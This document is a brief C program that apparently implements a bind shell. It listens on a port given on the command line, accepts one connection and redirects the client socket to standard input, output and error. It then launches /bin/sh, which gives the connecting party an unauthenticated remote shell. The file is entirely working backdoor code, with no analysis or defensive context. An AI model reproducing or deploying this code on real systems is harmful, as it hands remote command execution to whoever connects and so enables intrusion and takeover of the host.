#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>

#define BUFFER_SIZE 1024

void *recvData(void *vargp);

int main(int argc, char const *argv[])
{
    if (argc != 2)
    {
        printf("Usage %s <port>\n", argv[0]);
        exit(1);
    }
    struct sockaddr_in serv_addr, cli_addr;

    //create socket and struct
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(atoi(argv[1]));
    serv_addr.sin_addr.s_addr = INADDR_ANY;

    //we need to bind socket to an ip before calling listen+accept
    bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr));

    //listening for new client
    listen(sockfd, 5);

    //oh, here's one
    int clilen = sizeof(cli_addr);
    int clientfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);

    //print client IP
    char *cliip = inet_ntoa(cli_addr.sin_addr);
    printf("[+] Connected to client %s\n", cliip);

    //bind this client socket to stdin, stdout, stderr
    dup2(clientfd, 0);
    dup2(clientfd, 1);
    dup2(clientfd, 2);

    //so everything is redirected to /bin/sh
    execvp("/bin/sh", NULL);
    
    close(clientfd);
    close(sockfd);

    return 0;
}